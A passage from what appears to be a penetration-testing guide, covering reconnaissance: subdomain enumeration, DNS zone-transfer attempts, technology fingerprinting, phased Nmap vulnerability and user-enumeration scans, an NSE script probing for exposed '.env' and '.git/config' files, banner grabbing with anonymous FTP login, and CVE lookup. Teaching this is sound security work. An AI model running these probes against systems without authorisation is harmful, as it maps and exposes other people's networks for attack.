    # Save results to JSON
    with open('scan_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to scan_results.json")
```

[Continuing with more reconnaissance techniques...]
### Advanced Reconnaissance Techniques

#### Subdomain Enumeration

Finding subdomains reveals additional attack surface and potential entry points.

**Subdomain Enumeration Tools:**

```bash
#!/bin/bash
# Comprehensive Subdomain Enumeration

DOMAIN="example.com"
OUTPUT_DIR="recon_${DOMAIN}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting subdomain enumeration for $DOMAIN"

# Method 1: Certificate Transparency Logs
echo "[+] Checking Certificate Transparency logs..."
curl -s "https://crt.sh/?q=%.$DOMAIN&output=json" | \
    jq -r '.[].name_value' | \
    sed 's/\*\.//g' | \
    sort -u > "$OUTPUT_DIR/crt_sh_subdomains.txt"

# Method 2: Sublist3r
echo "[+] Running Sublist3r..."
sublist3r -d "$DOMAIN" -o "$OUTPUT_DIR/sublist3r.txt"

# Method 3: Amass (comprehensive)
echo "[+] Running Amass..."
amass enum -passive -d "$DOMAIN" -o "$OUTPUT_DIR/amass.txt"

# Method 4: DNS brute force with common names
echo "[+] DNS brute forcing..."
cat > "$OUTPUT_DIR/common_subdomains.txt" << 'EOF'
www
mail
ftp
admin
dev
test
staging
api
cdn
vpn
remote
portal
blog
shop
store
help
support
docs
m
mobile
EOF

while read subdomain; do
    if host "${subdomain}.${DOMAIN}" >/dev/null 2>&1; then
        echo "${subdomain}.${DOMAIN}" >> "$OUTPUT_DIR/brute_force_subdomains.txt"
    fi
done < "$OUTPUT_DIR/common_subdomains.txt"

# Method 5: Search engine dorking for subdomains
echo "[+] Search engine enumeration..."
python3 << 'PYTHON_EOF'
import requests
from bs4 import BeautifulSoup
import time

def google_search_subdomains(domain):
    subdomains = set()
    for page in range(0, 3):  # First 3 pages
        url = f"https://www.google.com/search?q=site:{domain}&start={page*10}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a'):
                href = link.get('href', '')
                if domain in href:
                    # Extract subdomain
                    parts = href.split('//')
                    if len(parts) > 1:
                        host = parts[1].split('/')[0]
                        if domain in host:
                            subdomains.add(host)
            
            time.sleep(2)  # Rate limiting
        except Exception as e:
            print(f"Error: {e}")
    
    return subdomains

# Would execute: subdomains = google_search_subdomains("example.com")
PYTHON_EOF

# Combine all results
echo "[+] Combining results..."
cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/all_subdomains.txt"

TOTAL=$(wc -l < "$OUTPUT_DIR/all_subdomains.txt")
echo "[✓] Found $TOTAL unique subdomains"

# Verify live hosts
echo "[+] Verifying live subdomains..."
while read subdomain; do
    if curl -s -o /dev/null -w "%{http_code}" "http://$subdomain" | grep -q "200\|301\|302"; then
        echo "$subdomain" >> "$OUTPUT_DIR/live_subdomains.txt"
    fi
done < "$OUTPUT_DIR/all_subdomains.txt"

LIVE=$(wc -l < "$OUTPUT_DIR/live_subdomains.txt" 2>/dev/null || echo 0)
echo "[✓] Found $LIVE live subdomains"

# Take screenshots of live subdomains (using eyewitness or similar)
# eyewitness -f "$OUTPUT_DIR/live_subdomains.txt" --web
```

**Advanced Subdomain Tools:**

```python
#!/usr/bin/env python3
"""
Advanced Subdomain Enumeration with DNS Analytics
"""
import dns.resolver
import dns.zone
import dns.query
import concurrent.futures
from typing import List, Set

class AdvancedSubdomainEnum:
    def __init__(self, domain: str):
        self.domain = domain
        self.found_subdomains = set()
    
    def dns_zone_transfer(self) -> List[str]:
        """
        Attempt DNS zone transfer (AXFR)
        Note: Rarely works on modern servers
        """
        subdomains = []
        
        try:
            # Get nameservers
            ns_records = dns.resolver.resolve(self.domain, 'NS')
            
            for ns in ns_records:
                ns_server = str(ns.target).rstrip('.')
                
                try:
                    # Attempt zone transfer
                    zone = dns.zone.from_xfr(
                        dns.query.xfr(ns_server, self.domain)
                    )
                    
                    # Extract all records
                    for name, node in zone.nodes.items():
                        subdomain = str(name)
                        if subdomain != '@':
                            full_domain = f"{subdomain}.{self.domain}"
                            subdomains.append(full_domain)
                    
                    print(f"[!] Zone transfer successful from {ns_server}")
                    break
                    
                except Exception as e:
                    # Expected to fail most of the time
                    pass
        
        except Exception as e:
            print(f"[-] DNS zone transfer failed: {e}")
        
        return subdomains
    
    def reverse_dns_sweep(self, ip_range: str) -> List[str]:
        """
        Perform reverse DNS lookup on IP range
        """
        subdomains = []
        
        # Parse IP range (e.g., "192.168.1.0/24")
        # Simplified - use ipaddress module in production
        base_ip = ip_range.split('/')[0]
        octets = base_ip.split('.')
        
        for i in range(1, 255):
            ip = f"{octets[0]}.{octets[1]}.{octets[2]}.{i}"
            
            try:
                # Reverse DNS lookup
                result = dns.resolver.resolve_address(ip)
                for rdata in result:
                    hostname = str(rdata).rstrip('.')
                    if self.domain in hostname:
                        subdomains.append(hostname)
            except:
                pass
        
        return subdomains
    
    def check_dns_wildcards(self) -> bool:
        """
        Check if domain uses wildcard DNS
        """
        random_subdomain = f"thisshouldnotexist{hash(self.domain)}.{self.domain}"
        
        try:
            dns.resolver.resolve(random_subdomain, 'A')
            print(f"[!] Wildcard DNS detected for {self.domain}")
            return True
        except:
            return False
    
    def permutation_scanning(self, known_subdomains: List[str]) -> Set[str]:
        """
        Generate subdomain permutations from known subdomains
        """
        permutations = set()
        
        prefixes = ['dev', 'test', 'staging', 'prod', 'uat', 'qa', 'demo']
        suffixes = ['api', 'admin', 'old', 'new', '2', 'backup']
        
        for subdomain in known_subdomains:
            # Remove domain part
            sub = subdomain.replace(f".{self.domain}", "")
            
            # Add prefixes
            for prefix in prefixes:
                permutations.add(f"{prefix}-{sub}.{self.domain}")
                permutations.add(f"{prefix}{sub}.{self.domain}")
            
            # Add suffixes
            for suffix in suffixes:
                permutations.add(f"{sub}-{suffix}.{self.domain}")
                permutations.add(f"{sub}{suffix}.{self.domain}")
        
        return permutations
    
    def dns_brute_force_threaded(self, wordlist: List[str], threads: int = 10) -> List[str]:
        """
        Multi-threaded DNS brute force
        """
        found = []
        
        def check_subdomain(subdomain_name):
            full_domain = f"{subdomain_name}.{self.domain}"
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                ips = [str(rdata) for rdata in answers]
                return (full_domain, ips)
            except:
                return None
        
        # Multi-threaded execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(check_subdomain, wordlist)
            
            for result in results:
                if result:
                    found.append(result[0])
                    print(f"[+] Found: {result[0]} -> {result[1]}")
        
        return found
    
    def comprehensive_enum(self, wordlist_file: str) -> dict:
        """
        Run all enumeration techniques
        """
        results = {
            'zone_transfer': [],
            'brute_force': [],
            'permutations': [],
            'total_unique': set()
        }
        
        # Check for wildcards
        has_wildcard = self.check_dns_wildcards()
        
        # Zone transfer attempt
        print("[*] Attempting zone transfer...")
        zt_results = self.dns_zone_transfer()
        results['zone_transfer'] = zt_results
        results['total_unique'].update(zt_results)
        
        # Brute force
        print("[*] Starting DNS brute force...")
        with open(wordlist_file, 'r') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        
        bf_results = self.dns_brute_force_threaded(wordlist)
        results['brute_force'] = bf_results
        results['total_unique'].update(bf_results)
        
        # Permutations
        print("[*] Generating permutations...")
        perms = self.permutation_scanning(list(results['total_unique']))
        
        # Check permutations
        perm_results = self.dns_brute_force_threaded(
            [p.replace(f".{self.domain}", "") for p in perms]
        )
        results['permutations'] = perm_results
        results['total_unique'].update(perm_results)
        
        return results

# Example usage
if __name__ == "__main__":
    enum = AdvancedSubdomainEnum("example.com")
    
    # Create small wordlist for demo
    with open('/tmp/wordlist.txt', 'w') as f:
        f.write('\n'.join(['www', 'mail', 'ftp', 'admin', 'dev', 'api']))
    
    results = enum.comprehensive_enum('/tmp/wordlist.txt')
    
    print(f"\n[✓] Total unique subdomains found: {len(results['total_unique'])}")
    for subdomain in sorted(results['total_unique']):
        print(f"  - {subdomain}")
```

#### Technology Fingerprinting

Identifying technologies helps select appropriate attack vectors.

**Wappalyzer-style Technology Detection:**

```python
#!/usr/bin/env python3
"""
Web Technology Fingerprinting
"""
import requests
from bs4 import BeautifulSoup
import re
import json

class TechFingerprinter:
    def __init__(self):
        self.signatures = self.load_signatures()
    
    def load_signatures(self):
        """
        Technology signatures (simplified version of Wappalyzer)
        """
        return {
            'cms': {
                'WordPress': {
                    'html': ['/wp-content/', '/wp-includes/', 'wp-json'],
                    'headers': {},
                    'meta': [{'name': 'generator', 'content': 'WordPress'}]
                },
                'Drupal': {
                    'html': ['Drupal.settings', '/sites/all/', '/sites/default/'],
                    'headers': {'X-Drupal-Cache': '.*'},
                    'meta': [{'name': 'generator', 'content': 'Drupal'}]
                },
                'Joomla': {
                    'html': ['/components/com_', '/media/system/js/'],
                    'headers': {},
                    'meta': [{'name': 'generator', 'content': 'Joomla'}]
                }
            },
            'frameworks': {
                'React': {
                    'html': ['react', '__REACT', 'react-dom'],
                    'headers': {}
                },
                'Angular': {
                    'html': ['ng-app', 'ng-controller', 'angular.js'],
                    'headers': {}
                },
                'Vue.js': {
                    'html': ['vue', 'v-app', 'v-model'],
                    'headers': {}
                },
                'Django': {
                    'html': ['csrfmiddlewaretoken'],
                    'headers': {}
                },
                'Laravel': {
                    'html': ['laravel_session'],
                    'headers': {}
                }
            },
            'servers': {
                'Apache': {
                    'headers': {'Server': 'Apache'}
                },
                'Nginx': {
                    'headers': {'Server': 'nginx'}
                },
                'IIS': {
                    'headers': {'Server': 'Microsoft-IIS'}
                }
            },
            'analytics': {
                'Google Analytics': {
                    'html': ['google-analytics.com/analytics.js', 'ga(\'create\'']
                },
                'Google Tag Manager': {
                    'html': ['googletagmanager.com/gtm.js']
                }
            },
            'cdn': {
                'Cloudflare': {
                    'headers': {'Server': 'cloudflare'},
                    'html': []
                },
                'Akamai': {
                    'headers': {'X-Akamai-Transformed': '.*'}
                }
            },
            'security': {
                'ModSecurity': {
                    'headers': {'Server': '.*ModSecurity'}
                },
                'fail2ban': {
                    'html': []  # Detected through behavior
                }
            }
        }
    
    def fingerprint_url(self, url: str) -> dict:
        """
        Fingerprint technologies used by a website
        """
        detected = {
            'cms': [],
            'frameworks': [],
            'servers': [],
            'analytics': [],
            'cdn': [],
            'security': [],
            'programming_languages': [],
            'databases': []
        }
        
        try:
            # Make request
            response = requests.get(url, timeout=10, allow_redirects=True)
            html_content = response.text
            headers = response.headers
            
            # Parse HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Check each technology signature
            for category, technologies in self.signatures.items():
                for tech_name, signatures in technologies.items():
                    is_detected = False
                    
                    # Check HTML content
                    for pattern in signatures.get('html', []):
                        if pattern in html_content:
                            is_detected = True
                            break
                    
                    # Check headers
                    for header_name, header_pattern in signatures.get('headers', {}).items():
                        if header_name in headers:
                            if re.search(header_pattern, headers[header_name], re.IGNORECASE):
                                is_detected = True
                                break
                    
                    # Check meta tags
                    for meta_sig in signatures.get('meta', []):
                        meta_tags = soup.find_all('meta', meta_sig)
                        if meta_tags:
                            is_detected = True
                            break
                    
                    if is_detected:
                        detected[category].append(tech_name)
            
            # Additional detection methods
            
            # Programming language hints
            if '.php' in html_content or 'PHPSESSID' in response.cookies:
                detected['programming_languages'].append('PHP')
            if '.asp' in html_content or '.aspx' in html_content:
                detected['programming_languages'].append('ASP.NET')
            if '.jsp' in html_content or 'JSESSIONID' in response.cookies:
                detected['programming_languages'].append('Java/JSP')
            
            # Database hints (from error messages - should be disabled in production!)
            if 'mysql' in html_content.lower():
                detected['databases'].append('MySQL')
            if 'postgresql' in html_content.lower():
                detected['databases'].append('PostgreSQL')
            if 'mssql' in html_content.lower() or 'microsoft sql' in html_content.lower():
                detected['databases'].append('Microsoft SQL Server')
            if 'mongodb' in html_content.lower():
                detected['databases'].append('MongoDB')
            
            # Additional headers analysis
            detected['headers'] = dict(headers)
            
            # Cookie analysis
            detected['cookies'] = response.cookies.get_dict()
            
            # Server version detection
            server_header = headers.get('Server', '')
            detected['server_version'] = server_header
            
            # Security headers check
            security_headers = {
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-XSS-Protection': headers.get('X-XSS-Protection')
            }
            detected['security_headers'] = {k: v for k, v in security_headers.items() if v}
            
        except Exception as e:
            detected['error'] = str(e)
        
        return detected
    
    def generate_report(self, url: str) -> str:
        """
        Generate detailed fingerprinting report
        """
        results = self.fingerprint_url(url)
        
        report = f"\n{'='*60}\n"
        report += f"Technology Fingerprinting Report: {url}\n"
        report += f"{'='*60}\n\n"
        
        # CMS
        if results['cms']:
            report += f"CMS: {', '.join(results['cms'])}\n"
        
        # Frameworks
        if results['frameworks']:
            report += f"Frameworks: {', '.join(results['frameworks'])}\n"
        
        # Server
        if results['servers']:
            report += f"Web Server: {', '.join(results['servers'])}\n"
        if results['server_version']:
            report += f"Server Version: {results['server_version']}\n"
        
        # Programming Languages
        if results['programming_languages']:
            report += f"Programming Languages: {', '.join(results['programming_languages'])}\n"
        
        # Databases
        if results['databases']:
            report += f"Databases: {', '.join(results['databases'])}\n"
        
        # CDN
        if results['cdn']:
            report += f"CDN: {', '.join(results['cdn'])}\n"
        
        # Analytics
        if results['analytics']:
            report += f"Analytics: {', '.join(results['analytics'])}\n"
        
        # Security
        if results['security']:
            report += f"Security Software: {', '.join(results['security'])}\n"
        
        # Security Headers
        report += f"\nSecurity Headers:\n"
        if results['security_headers']:
            for header, value in results['security_headers'].items():
                report += f"  ✓ {header}: {value[:50]}...\n" if len(value) > 50 else f"  ✓ {header}: {value}\n"
        else:
            report += "  ✗ No security headers detected\n"
        
        # Missing critical headers
        critical_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        missing = [h for h in critical_headers if h not in results.get('security_headers', {})]
        if missing:
            report += f"\n  ⚠ Missing security headers: {', '.join(missing)}\n"
        
        return report

# Example usage
if __name__ == "__main__":
    fingerprinter = TechFingerprinter()
    
    # Example targets (use your own authorized targets)
    targets = [
        "https://wordpress.com",
        "https://www.drupal.org"
    ]
    
    for target in targets:
        print(fingerprinter.generate_report(target))
```

### Active Reconnaissance Techniques

#### Network Scanning with Nmap

**Advanced Nmap Techniques:**

```bash
#!/bin/bash
# Advanced Nmap Scanning Strategy

TARGET="10.0.0.0/24"
OUTPUT_DIR="nmap_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting comprehensive Nmap scan of $TARGET"

# Phase 1: Host Discovery (Light touch)
echo "[+] Phase 1: Host discovery"
nmap -sn -PE -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443 \
    -oA "$OUTPUT_DIR/host_discovery" \
    $TARGET

# Extract live hosts
grep "Up" "$OUTPUT_DIR/host_discovery.gnmap" | cut -d " " -f 2 > "$OUTPUT_DIR/live_hosts.txt"

LIVE_COUNT=$(wc -l < "$OUTPUT_DIR/live_hosts.txt")
echo "[✓] Found $LIVE_COUNT live hosts"

# Phase 2: Port Scanning (SYN scan for speed)
echo "[+] Phase 2: Port scanning"
nmap -sS -p- --min-rate 1000 -T4 \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/all_ports" \
    --open

# Phase 3: Service Version Detection
echo "[+] Phase 3: Service version detection"
nmap -sV -sC --version-intensity 9 \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/service_detection"

# Phase 4: OS Detection
echo "[+] Phase 4: OS detection"
nmap -O --osscan-guess \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/os_detection"

# Phase 5: Vulnerability Scanning
echo "[+] Phase 5: Vulnerability scanning"
nmap --script vuln \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/vulnerability_scan"

# Phase 6: Specific Service Enumeration

# Web servers
echo "[+] Enumerating web servers"
nmap -p 80,443,8080,8443 \
    --script http-enum,http-headers,http-methods,http-robots.txt,http-title \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/web_enum"

# SMB
echo "[+] Enumerating SMB"
nmap -p 139,445 \
    --script smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/smb_enum"

# DNS
echo "[+] Enumerating DNS"
nmap -p 53 \
    --script dns-zone-transfer,dns-service-discovery \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/dns_enum"

# FTP
echo "[+] Enumerating FTP"
nmap -p 21 \
    --script ftp-anon,ftp-bounce,ftp-syst \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/ftp_enum"

# SSH
echo "[+] Enumerating SSH"
nmap -p 22 \
    --script ssh-auth-methods,ssh-hostkey \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/ssh_enum"

# SMTP
echo "[+] Enumerating SMTP"
nmap -p 25,465,587 \
    --script smtp-commands,smtp-enum-users,smtp-open-relay \
    -iL "$OUTPUT_DIR/live_hosts.txt" \
    -oA "$OUTPUT_DIR/smtp_enum"

# Generate summary report
echo "[+] Generating summary report"
cat > "$OUTPUT_DIR/REPORT.txt" << EOF
Nmap Comprehensive Scan Report
==============================
Target: $TARGET
Date: $(date)
Live Hosts: $LIVE_COUNT

Results stored in: $OUTPUT_DIR/

Key Files:
- live_hosts.txt: List of responsive hosts
- all_ports.*: All open ports found
- service_detection.*: Service versions
- os_detection.*: Operating system fingerprints
- vulnerability_scan.*: Vulnerability scan results
- *_enum.*: Service-specific enumeration

To view results:
- HTML: firefox $OUTPUT_DIR/*.html
- XML: Parse with custom scripts
- Grep-able: grep "open" $OUTPUT_DIR/*.gnmap
EOF

echo "[✓] Scan complete! Results in $OUTPUT_DIR/"
echo "[✓] View report: cat $OUTPUT_DIR/REPORT.txt"
```

**Nmap Scripting Engine (NSE) Custom Scripts:**

```lua
-- custom-vuln-check.nse
-- Custom Nmap NSE script for vulnerability detection

description = [[
Checks for common web application vulnerabilities
]]

author = "Security Researcher"
license = "Same as Nmap"
categories = {"vuln", "safe"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

portrule = shortport.http

action = function(host, port)
    local output = {}
    local vulns = 0
    
    -- Check for directory listing
    local response = http.get(host, port, "/")
    if response and response.body then
        if string.match(response.body, "Index of") or 
           string.match(response.body, "Directory listing") then
            table.insert(output, "Directory listing enabled")
            vulns = vulns + 1
        end
    end
    
    -- Check for common files
    local common_files = {
        "/.git/config",
        "/.env",
        "/config.php.bak",
        "/backup.zip",
        "/admin",
        "/phpmyadmin"
    }
    
    for _, file in ipairs(common_files) do
        local response = http.get(host, port, file)
        if response and response.status == 200 then
            table.insert(output, string.format("Found: %s", file))
            vulns = vulns + 1
        end
    end
    
    -- Check security headers
    local response = http.get(host, port, "/")
    if response and response.header then
        if not response.header["x-frame-options"] then
            table.insert(output, "Missing X-Frame-Options header")
            vulns = vulns + 1
        end
        if not response.header["x-content-type-options"] then
            table.insert(output, "Missing X-Content-Type-Options header")
            vulns = vulns + 1
        end
        if not response.header["strict-transport-security"] then
            table.insert(output, "Missing HSTS header")
            vulns = vulns + 1
        end
    end
    
    if vulns > 0 then
        return string.format("Found %d potential issues:\n%s", 
            vulns, table.concat(output, "\n"))
    end
    
    return "No obvious vulnerabilities found"
end
```

#### Banner Grabbing and Service Enumeration

**Multi-Protocol Banner Grabbing:**

```python
#!/usr/bin/env python3
"""
Advanced Banner Grabbing and Service Enumeration
"""
import socket
import ssl
import telnetlib
import ftplib
import smtplib
from typing import Dict, Optional

class ServiceEnumerator:
    def __init__(self, target_ip: str, timeout: int = 5):
        self.target = target_ip
        self.timeout = timeout
    
    def grab_banner(self, port: int, protocol: str = 'tcp') -> Optional[str]:
        """
        Generic banner grabbing
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))
            
            # Send initial probe (some services need it)
            sock.send(b'\r\n')
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner.strip()
        except Exception as e:
            return None
    
    def enumerate_http(self, port: int, ssl_enabled: bool = False) -> Dict:
        """
        HTTP/HTTPS service enumeration
        """
        results = {
            'server': None,
            'headers': {},
            'methods': [],
            'banner': None
        }
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            if ssl_enabled:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            sock.connect((self.target, port))
            
            # Send HTTP request
            request = b"HEAD / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n"
            sock.send(request)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            # Parse response
            lines = response.split('\r\n')
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    results['headers'][key.strip()] = value.strip()
            
            results['server'] = results['headers'].get('Server')
            results['banner'] = lines[0] if lines else None
            
            # Try OPTIONS request for allowed methods
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if ssl_enabled:
                sock = context.wrap_socket(sock, server_hostname=self.target)
            sock.connect((self.target, port))
            
            request = b"OPTIONS / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n"
            sock.send(request)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            for line in response.split('\r\n'):
                if line.startswith('Allow:'):
                    methods = line.split(':', 1)[1].strip()
                    results['methods'] = [m.strip() for m in methods.split(',')]
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def enumerate_ssh(self, port: int = 22) -> Dict:
        """
        SSH service enumeration
        """
        results = {
            'version': None,
            'algorithms': {}
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))
            
            # Receive SSH banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            results['version'] = banner.strip()
            
            # Send our version
            sock.send(b"SSH-2.0-OpenSSH_8.0\r\n")
            
            # Receive algorithm negotiation (simplified)
            data = sock.recv(4096)
            # In real implementation, parse SSH protocol packets
            
            sock.close()
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def enumerate_smtp(self, port: int = 25) -> Dict:
        """
        SMTP service enumeration
        """
        results = {
            'banner': None,
            'commands': [],
            'vrfy_enabled': False,
            'expn_enabled': False
        }
        
        try:
            smtp = smtplib.SMTP(timeout=self.timeout)
            smtp.connect(self.target, port)
            
            # Get banner
            results['banner'] = smtp.ehlo_resp.decode() if smtp.ehlo_resp else None
            
            # Check VRFY command
            try:
                code, msg = smtp.verify('root')
                results['vrfy_enabled'] = (code == 250)
            except:
                results['vrfy_enabled'] = False
            
            # Check EXPN command
            try:
                smtp.docmd('EXPN', 'root')
                results['expn_enabled'] = True
            except:
                results['expn_enabled'] = False
            
            smtp.quit()
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def enumerate_ftp(self, port: int = 21) -> Dict:
        """
        FTP service enumeration
        """
        results = {
            'banner': None,
            'anonymous_login': False,
            'features': []
        }
        
        try:
            ftp = ftplib.FTP(timeout=self.timeout)
            
            # Connect and get banner
            response = ftp.connect(self.target, port)
            results['banner'] = response
            
            # Try anonymous login
            try:
                ftp.login('anonymous', 'anonymous@example.com')
                results['anonymous_login'] = True
                
                # List files if successful
                files = []
                ftp.retrlines('LIST', files.append)
                results['files'] = files[:10]  # First 10 files
                
            except:
                results['anonymous_login'] = False
            
            # Get features
            try:
                features = ftp.sendcmd('FEAT')
                results['features'] = features.split('\n')[1:-1]
            except:
                pass
            
            ftp.quit()
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def enumerate_smb(self, port: int = 445) -> Dict:
        """
        SMB service enumeration
        """
        results = {
            'os_version': None,
            'smb_version': None,
            'signing_required': False,
            'shares': []
        }
        
        try:
            # Use smbclient or impacket library in production
            # This is simplified example
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))
            
            # SMB negotiation (simplified - use proper SMB library)
            # Send SMB negotiate protocol request
            # Receive response and parse
            
            sock.close()
            
            # In production, use:
            # from impacket import smbconnection
            # conn = smbconnection.SMBConnection(target, target)
            # ...
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def comprehensive_enum(self, port: int) -> Dict:
        """
        Attempt to identify and enumerate service on port
        """
        # Common port-to-service mapping
        service_map = {
            21: ('FTP', self.enumerate_ftp),
            22: ('SSH', self.enumerate_ssh),
            25: ('SMTP', self.enumerate_smtp),
            80: ('HTTP', lambda p: self.enumerate_http(p, False)),
            443: ('HTTPS', lambda p: self.enumerate_http(p, True)),
            445: ('SMB', self.enumerate_smb),
            3306: ('MySQL', None),
            5432: ('PostgreSQL', None),
            8080: ('HTTP-Alt', lambda p: self.enumerate_http(p, False))
        }
        
        results = {
            'port': port,
            'service': None,
            'banner': None,
            'details': {}
        }
        
        # Try generic banner grab first
        banner = self.grab_banner(port)
        results['banner'] = banner
        
        # Try service-specific enumeration
        if port in service_map:
            service_name, enum_func = service_map[port]
            results['service'] = service_name
            
            if enum_func:
                try:
                    results['details'] = enum_func(port)
                except Exception as e:
                    results['details'] = {'error': str(e)}
        
        return results

# Example usage
if __name__ == "__main__":
    target = "10.0.0.1"
    enum = ServiceEnumerator(target)
    
    # Enumerate common ports
    common_ports = [21, 22, 25, 80, 443, 445, 3389, 8080]
    
    print(f"\n[*] Enumerating services on {target}\n")
    
    for port in common_ports:
        print(f"[+] Scanning port {port}...")
        results = enum.comprehensive_enum(port)
        
        if results['banner'] or results['details']:
            print(f"    Service: {results.get('service', 'Unknown')}")
            if results['banner']:
                print(f"    Banner: {results['banner'][:100]}")
            if results['details']:
                print(f"    Details: {results['details']}")
            print()
```

[Continuing with vulnerability assessment, exploitation, and remaining sections...]
## 2.2 Vulnerability Assessment

Vulnerability assessment systematically identifies, classifies, and prioritizes security weaknesses in systems and applications.

### Understanding CVE, CVSS, and CWE

**CVE (Common Vulnerabilities and Exposures):**
- Unique identifier for publicly known vulnerabilities
- Format: CVE-YEAR-NUMBER (e.g., CVE-2024-1234)
- Maintained by MITRE Corporation

**CVSS (Common Vulnerability Scoring System):**
- Standardized scoring system (0.0 to 10.0)
- Severity ratings:
  - 0.0: None
  - 0.1-3.9: Low
  - 4.0-6.9: Medium
  - 7.0-8.9: High
  - 9.0-10.0: Critical

**CWE (Common Weakness Enumeration):**
- Categorization of software weaknesses
- Examples: CWE-79 (XSS), CWE-89 (SQL Injection)

**Vulnerability Lookup Automation:**

```python
#!/usr/bin/env python3
"""
CVE and Vulnerability Intelligence Gathering
"""
import requests
import json
from datetime import datetime, timedelta

class VulnerabilityIntelligence:
    def __init__(self):
        self.nvd_api = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.cve_details_url = "https://cve.mitre.org/cgi-bin/cvename.cgi?name="
    
    def search_cve(self, keyword: str, days_back: int = 30) -> list:
        """
        Search NVD for CVEs containing keyword
        """
        # Calculate date range
        end_date = datetime.now()
        start_date = end_date - timedelta(days=days_back)
        
        params = {
            'keywordSearch': keyword,
            'pubStartDate': start_date.strftime('%Y-%m-%dT00:00:00.000'),
            'pubEndDate': end_date.strftime('%Y-%m-%dT23:59:59.999')
        }
        
        try:
            response = requests.get(self.nvd_api, params=params, timeout=30)
            if response.status_code == 200:
                data = response.json()
                vulnerabilities = data.get('vulnerabilities', [])
                
                results = []
                for vuln in vulnerabilities:
                    cve_data = vuln.get('cve', {})
                    cve_id = cve_data.get('id')
                    
                    # Get CVSS score
                    metrics = cve_data.get('metrics', {})
                    cvss_v3 = metrics.get('cvssMetricV31', [{}])[0]
                    cvss_data = cvss_v3.get('cvssData', {})
                    
                    # Get description
                    descriptions = cve_data.get('descriptions', [])
                    description = descriptions[0].get('value', '') if descriptions else ''
                    
                    results.append({
                        'cve_id': cve_id,
                        'description': description,
                        'cvss_score': cvss_data.get('baseScore'),
                        'severity': cvss_data.get('baseSeverity'),
                        'published_date': cve_data.get('published'),
                        'url': f"{self.cve_details_url}{cve_id}"
                    })
                
                return results
            
        except Exception as e:
            print(f"Error searching CVE: {e}")
            return []
    
    def get_cve_details(self, cve_id: str) -> dict:
        """
        Get detailed information about specific CVE
        """
        try:
            response = requests.get(
                f"{self.nvd_api}?cveId={cve_id}",
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                vulnerabilities = data.get('vulnerabilities', [])
                
                if vulnerabilities:
                    cve_data = vulnerabilities[0].get('cve', {})
                    
                    # Extract all details
                    metrics = cve_data.get('metrics', {})
                    cvss_v3 = metrics.get('cvssMetricV31', [{}])[0]
                    
                    # Get references
                    references = cve_data.get('references', [])
                    ref_urls = [ref.get('url') for ref in references]
                    
                    # Get weakness (CWE)
                    weaknesses = cve_data.get('weaknesses', [])
                    cwe_ids = []
                    for weakness in weaknesses:
                        descriptions = weakness.get('description', [])
                        for desc in descriptions:
                            cwe_ids.append(desc.get('value'))
                    
                    # Get configurations (affected products)
                    configurations = cve_data.get('configurations', [])
                    
                    return {
                        'cve_id': cve_id,
                        'description': cve_data.get('descriptions', [{}])[0].get('value', ''),
